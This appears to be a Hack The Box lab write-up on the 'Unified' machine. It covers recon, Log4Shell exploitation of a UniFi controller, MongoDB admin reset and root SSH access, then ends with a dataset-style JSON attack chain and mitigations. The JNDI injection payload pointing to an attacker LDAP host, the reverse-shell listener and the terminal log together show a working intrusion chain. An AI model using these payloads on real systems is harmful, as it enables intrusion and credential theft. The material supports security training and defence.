# HTB Unified - UniFi Log4Shell to Application Admin to Root SSH Access

Scope: authorized HTB lab only.
Focus: vulnerable UniFi controller exposure, JNDI callback verification, remote code execution path, and credential-based root access.

---

## 1. Investigation Objective

1. Map exposed network services and management interfaces.
2. Validate whether UniFi version is vulnerable to Log4Shell-like injection.
3. Obtain controlled shell access for host-level visibility.
4. Identify local data sources that enable privilege escalation.
5. Confirm root-level compromise path and defensive gaps.

---

## 2. Recon and Service Mapping

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

Typical findings:
- 22/tcp SSH
- 6789/tcp UniFi device management endpoint
- 8080/tcp redirecting to controller service
- 8443/tcp UniFi web management

Web observation:
- `/manage` endpoint serves UniFi login panel.

---

## 3. Vulnerability Validation (JNDI Callback)

Intercept login request and modify JSON field used by backend logging (commonly `remember` in this workflow):

```json
"remember": "${jndi:ldap://<ATTACKER_IP>/test}"
```

Monitor for callback:

```bash
tcpdump -i tun0 port 389
```

Assessment:
- inbound LDAP request from target indicates exploitable lookup behavior.

---

## 4. Exploitation and Shell Access

Prepare LDAP/JNDI exploitation infrastructure and listener in controlled lab setup, then trigger payload in modified request.

Listener example:

```bash
nc -lvnp 4444
```

Post-trigger validation:

```bash
whoami
```

Observed foothold user in common Unified path:
- `michael`

---

## 5. Local Enumeration and Admin Reset Path

Stabilize shell:

```bash
script /dev/null -c bash
```

Inspect local data services:

```bash
ps aux | grep -i mongo
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

When administrative records are exposed, updating admin auth hash can restore application admin access in this lab path.

Application result:
- controller admin panel access regained.
- root SSH credential discovered in controller settings.

---

## 6. Root Access Confirmation

```bash
ssh root@<TARGET_IP>
ls /root
cat /root/root.txt
```

---

## 7. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn 10.129.214.12
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH ...
6789/tcp open  ibm-db2?
8080/tcp open  http    (redirect)
8443/tcp open  ssl/http UniFi Controller

Browser:
https://10.129.214.12:8443/manage -> UniFi login

Burp payload (sanitized):
"remember":"${jndi:ldap://10.10.14.6/test}"

analyst@kali:~$ tcpdump -i tun0 port 389
IP 10.129.214.12.XXXXX > 10.10.14.6.389: LDAP ...

analyst@kali:~$ nc -lvnp 4444
connect to [10.10.14.6] from (UNKNOWN) [10.129.214.12]
$ whoami
michael

$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
{ "name" : "administrator", ... }

Controller settings evidence:
root SSH credential disclosed in management UI

analyst@kali:~$ ssh root@10.129.214.12
root@unified:~# whoami
root
```

---

## 8. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "unified_unifi_log4shell_to_root_credential_disclosure",
	"input_signals": [
		"UniFi management interface exposed on 8443",
		"Injected JNDI token triggered outbound LDAP callback",
		"Remote shell established as low-privileged local user",
		"MongoDB-backed admin data accessible locally",
		"Controller UI exposed root SSH credential"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Service and Management Interface Discovery",
			"confidence": 0.95,
			"evidence": "nmap and web enumeration identified UniFi controller endpoints"
		},
		{
			"step": 2,
			"tactic": "execution",
			"technique": "Exploitation for Remote Code Execution (JNDI Injection)",
			"confidence": 0.92,
			"evidence": "LDAP callback observed after payload injection"
		},
		{
			"step": 3,
			"tactic": "credential_access",
			"technique": "Credential Manipulation and Disclosure",
			"confidence": 0.86,
			"evidence": "admin reset path in local DB and root SSH credential revealed in panel"
		},
		{
			"step": 4,
			"tactic": "privilege_escalation",
			"technique": "Valid Accounts",
			"confidence": 0.89,
			"evidence": "successful root SSH login with disclosed credential"
		}
	],
	"hypotheses": [
		"Additional UniFi controllers with similar versioning may be vulnerable",
		"Credential storage and display practices likely expose other secrets",
		"Outbound egress controls are insufficient to block exploitation callbacks"
	],
	"uncertainties": [
		"Exact patch state of all Java components on host not verified",
		"No confirmation whether exploit path survives service restarts",
		"Unknown if security monitoring detects anomalous JNDI patterns"
	],
	"tool_calls": [
		{"name": "unifi_version_exposure_mapper", "priority": "high"},
		{"name": "jndi_callback_detector", "priority": "high"},
		{"name": "credential_display_leak_auditor", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Patch UniFi and Java logging dependencies to non-vulnerable versions",
			"Rotate controller admin and root credentials immediately",
			"Restrict management interfaces to trusted networks"
		],
		"hardening": [
			"Disable unsafe lookup behaviors in logging configuration",
			"Apply egress filtering to block arbitrary LDAP/RMI callbacks",
			"Remove plaintext credential exposure from management UI"
		],
		"monitoring": [
			"Alert on outbound LDAP/RMI traffic from management servers",
			"Detect suspicious payload patterns containing jndi tokens",
			"Track privileged login events tied to recently changed credentials"
		]
	}
}
```
 